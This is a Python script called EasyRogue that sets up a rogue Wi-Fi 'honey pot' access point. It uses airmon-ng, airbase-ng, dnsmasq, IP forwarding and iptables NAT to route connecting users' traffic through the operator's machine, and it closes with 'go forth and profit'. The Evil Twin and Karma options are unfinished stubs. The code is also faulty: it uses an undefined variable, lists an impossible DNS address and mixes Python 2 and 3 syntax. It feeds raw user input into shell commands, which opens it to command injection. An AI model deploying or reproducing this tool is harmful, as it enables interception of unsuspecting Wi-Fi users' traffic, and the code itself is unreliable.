#!/usr/bin/python
'''
Author: FATGEEK 
Contact: fatgeek@gmail.com
Description: Little script that helps you creating a fake access point
Version: 0.1 "Just getting the script working, enhancments are coming ;)"
'''
#Getting ready
import os
from time import sleep as slp
import ERfonctions as mod
import subprocess as sp
import math

#Variables
waitincrement = 0
jump = 0

#Config Infos
MODE = "Honey Pot"
DHCPStart = "10.0.0.50"
DHCPStop = "10.0.0.150"
DNS = "189.23.65.345"
ESSID = "Happy Fox"
CHANNEL = "6"
PASS = "S3CR3TP4SSW0RD"
STATUS = "Inactive"

def InfosHeader():
    os.system('clear')
    #Printing informations about the config of the AP
    print(mod.colors.LGREEN + 
  "\n          ******************************" + mod.colors.DEFAULT)
    print(mod.colors.LCYAN +
    "           EasyRogue v0.1 Configuration\n" + mod.colors.DEFAULT
    )
    print(
    "           Fake AP Mode : " + mod.colors.LRED + (MODE) + mod.colors.DEFAULT)
    print(
    "           ESSID        : " + mod.colors.LRED + ESSID + mod.colors.DEFAULT)
    print(
    "           Channel      : " + mod.colors.LRED + CHANNEL + mod.colors.DEFAULT)
    print(
    "           Password     : "+ mod.colors.LRED + PASS + mod.colors.DEFAULT)
    print(
    "           DHCP Start   : " + mod.colors.LRED + DHCPStart + mod.colors.DEFAULT)
    print(
    "           DHCP Stop    : " + mod.colors.LRED + DHCPStop + mod.colors.DEFAULT)
    print(
    "           DNS Server   : " + mod.colors.LRED + DNS + mod.colors.DEFAULT)
    print(
    "           Status       : " + mod.colors.LRED + STATUS + mod.colors.DEFAULT)
    print(mod.colors.LGREEN + 
  "\n          *****************************\n" + mod.colors.DEFAULT)
InfosHeader()
slp(10)
while jump == 0:
    mod.WelcomeHeader()

#Things're getting serious ;)
    if (waitincrement == 0):
        slp(1)
        waitincrement = 1
    print("        [" + mod.colors.LGREEN + "*" + mod.colors.DEFAULT + "] There are three ways to create a Rogue Access Point :")

    print(mod.colors.BLUE + 
"\n            1" + mod.colors.DEFAULT + ") Evil Twin Access Point")
    print(mod.colors.BLUE + 
"\n            2" + mod.colors.DEFAULT + ") Honey Pot")
    print(mod.colors.BLUE + 
"\n            3" + mod.colors.DEFAULT + ") Karma Attack Access Point")

    APWay = raw_input(
"\n        [" + mod.colors.YELLOW + "?" + mod.colors.DEFAULT + "] Which one do you want to use ? ")
    try:
        APWay = int(APWay)
    except:
        print(
"\n           [" + mod.colors.LRED + "!" + mod.colors.DEFAULT + "] Invalide answer !")
        slp(2)
        continue
    if (APWay == 1):
            #INSERT EVIL TWIN HERE
            #AIRPLAY-NG, HOSTAPD, etc...
        print(
"\n           [" + mod.colors.LRED + "!" + mod.colors.DEFAULT + "] " + "This part is not finished yet...")
        slp(2)
        continue
    elif (APWay == 3):
            #INSERT KARMA ATTACK HERE
        print(
"\n           [" + mod.colors.LRED + "!" + mod.colors.DEFAULT + "] This part is not finished yet...")
        slp(2)
        continue
    elif APWay == 2:
        jump = 2
        break
    else:
        print(
"\n           [" + mod.colors.LRED + "!" + mod.colors.DEFAULT + "] Invalide answer !")
        slp(2)
        continue
    
DNStart = input(
"Give me a starting DHCP address for this fake AP clients (e.g. 10.0.0.50)\n--> ")
DNStop = input("Give me a stopping DHCP address (e.g. 10.0.0.150)\n--> ")

#Create the dnsmasq config file
f = open('dnsmasq.conf', 'w')
f.write('interface=at0\n' +
'dhcp-range='+ DNStart + ',' + DNStop + ',12h\n' +
'server=80.67.169.12\n' +
'server=80.67.169.40\n')             #These DNSs do not log your web-activity
f.close()

#Set up the monitor card
interface = input("What wireless interface should be put into monitor mode? (e.g. wlan1)\n--> ")

#Now set up airbase-ng and your fake AP

ssid = input("What ESSID do you want to broadcast at? \n--> ")
channel = input("On which channel do you want to emit ? 1-11")
os.system('airmon-ng start ' + interface)
print "Now launching \"airbase-ng --essid %s mon0\"" % ssid
os.system('airbase-ng --essid %s mon0 &>/dev/null &' % ssid)

#Now Call DNSMASq to handle the DHCP for the connection
os.system('dnsmasq -C dnsmasq.conf')

#Enable the at0 interface
ip = starter.split('.')
at_ip = ip[0] + '.' + ip[1] + '.' + ip[2] + '.1'
os.system ('ifconfig at0 ' + at_ip + ' up netmask 255.255.255.0')

#Now set up IPv4 Forwarding
print "Making sure IPv4 forwarding is enabled..."
os.system('echo \'1\' > /proc/sys/net/ipv4/ip_forward')

#Now set up IPTables to be NAT
print "almost done..."
interwebz = raw_input("Enter the interface connected to the Interwebz (e.g. eth0)\n--> ")
print "working some IPtables...I hate IPtables..."
os.system('iptables --flush')
os.system('iptables --table nat --flush')
os.system('iptables --delete-chain')
os.system('iptables --table nat --delete-chain')
os.system('iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' % interwebz)
os.system('iptables --append FORWARD --in-interface '+ interface +' -j ACCEPT')

print "%s should be broadcasting, now go forth and profit" % ssid
